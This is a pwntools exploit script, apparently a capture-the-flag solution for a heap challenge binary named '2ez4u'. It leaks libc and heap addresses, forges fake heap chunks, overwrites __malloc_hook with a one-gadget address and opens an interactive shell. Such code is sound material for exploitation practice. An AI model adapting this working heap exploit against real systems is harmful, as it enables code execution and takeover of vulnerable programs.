from pwn import *
import sys
context.arch = 'amd64'
binary = ELF("./2ez4u")
status = sys.argv[1]

if status == 'l':
    io   = process("./2ez4u")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
elif status == 'd':
    io   = process("./2ez4u",env={"LD_PRELOAD":"./libc.so"})
    libc = ELF("./libc.so")
    context.log_level = "debug"
else:
    info("INVALID STATUS")
    exit()

def addA(len, desc):
    io.recvuntil('your choice:')
    io.sendline('1')
    io.recvuntil('color?(0:red, 1:green):')
    io.sendline('0')
    io.recvuntil('value?(0-999):')
    io.sendline('0')
    io.recvuntil('num?(0-16)')
    io.sendline('0')
    io.recvuntil('description length?(1-1024):')
    io.sendline(str(len))
    io.recvuntil('description of the apple:')
    io.sendline(desc)
def delA(idx):
    io.recvuntil('your choice:')
    io.sendline('2')
    io.recvuntil('which?(0-15):')
    io.sendline(str(idx))
def editA(idx, desc):
    io.recvuntil('your choice:')
    io.sendline('3')
    io.recvuntil('which?(0-15):')
    io.sendline(str(idx))
    io.recvuntil('color?(0:red, 1:green):')
    io.sendline('2')
    io.recvuntil('value?(0-999):')
    io.sendline('1000')
    io.recvuntil('num?(0-16)')
    io.sendline('17')
    io.recvuntil('new description of the apple:')
    io.sendline(desc)
def showA(idx):
    io.recvuntil('your choice:')
    io.sendline('4')
    io.recvuntil('which?(0-15):')
    io.sendline(str(idx))

dleak_libc_offset = (0x7fb3aac57b78-0x7fb3aa893000)

addA(0x200,'aaaa') 	#0
addA(0x200,'bbbb')	#1
addA(0x100,'cccc')	#2
delA(0)
delA(1)
addA(0x210,'x')		#0
showA(1)
io.recvuntil('description:')
libc_base = u64(io.recv(6).ljust(8,'\x00'))-(dleak_libc_offset)
info("LIBC BASE -> %#x"%libc_base)
delA(2)
delA(0)

addA(0x100,'aaaa')	#0
addA(0x3f0,'bbbb')	#1
addA(0x100,'cccc')	#2
addA(0x3e0,'dddd')	#3
addA(0x100,'eeee')	#4
delA(1)
delA(3)
addA(0x400,'eeee')	#1
showA(3)
io.recvuntil('description:')
heap_base = u64(io.recv(6).ljust(8,'\x00'))&0xfffffffff000
info("HEAP BASE -> %#x"%heap_base)
delA(4)
delA(2)
delA(1)
delA(0)

addA(0x30,'aaaa')	#0
addA(0x30,'bbbb')	#1 
addA(0x200,'dddd')	#2 #avoid lose idx 2
addA(0x48,'eeee')	#3
delA(2)
delA(1)
delA(0)
addA(0x190,'dddd')	#0
fake_pd = (0x298-0x108)*'\x00'
fake_pd += p64(0x71)
fake_pd += p64(libc_base+(0x7fb707737b78-0x7fb707373000))
fake_pd += p64(libc_base+libc.sym['__malloc_hook']-0x50)
editA(2,fake_pd)
addA(0x48,'eeee')	#1
delA(1)
fake_pd = (0x298-0x108)*'\x00'
fake_pd += p64(0x71)
fake_pd += p64(libc_base+libc.sym['__malloc_hook']-0x50-3+0x10)
editA(2,fake_pd)
addA(0x48,'ffff')	#1
fake_hk = (0x8+3)*'\x00'
fake_hk += p64(libc_base+(0x7f08b40dde20-0x7f08b4058000))
fake_hk += p64(libc_base+0x4526a)
fake_hk += p64(libc_base+libc.sym['realloc']+0x10)#`sub rsp,38h`
addA(0x48,fake_hk)	#2
io.recvuntil('your choice:')
io.sendline('1')
io.recvuntil('color?(0:red, 1:green):')
io.sendline('0')
io.recvuntil('value?(0-999):')
io.sendline('0')
io.recvuntil('num?(0-16)')
io.sendline('0')
io.recvuntil('description length?(1-1024):')
io.sendline('20')

io.interactive()
